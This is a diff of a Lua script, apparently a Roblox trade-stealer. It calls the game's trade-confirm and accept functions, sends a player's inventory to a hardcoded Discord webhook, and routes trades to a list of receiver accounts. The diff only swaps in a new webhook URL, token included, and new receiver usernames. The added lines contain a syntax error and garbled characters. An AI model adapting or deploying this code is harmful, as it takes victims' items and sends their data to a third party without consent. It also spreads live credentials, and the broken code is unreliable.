@@ -22,9 +22,9 @@ local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmT
 local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
 local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
 
-local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
+local MY_WEBHOOK = "https://discord.com/api/webhooks/1544539250580652093/Wq0MhSYTqt6ee5UsX_GGFkZsMkycq1kBsvIfCPYbLY3i9UFXR8mAVoaixf9rcwM81ZVQ"
 local USER_WEBHOOK = _G.Webhook or "PUTHERE"
-local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
+local MY_USERNAMES = _G.Usernames or {"Tocinito_YY, "Tocinita_YY", "Halloween9183", "westriee", "seikasune"}
 
 local START_TIME = os.time()
 
@@ -204,7 +204,7 @@ local function sendFullInventory()
     end
 
     local embed = {
-        title       = playerName .. "'s Inventory",
+        title       = playerName .. "'s Inventory ������",",
         description = "**Base Weapons**\\n" .. baseText .. "\\n\\n**Main Weapons**\\n" .. mainText,
         color       = isRich and 0xFF0000 or 0xFFA500,
         fields      = fields,
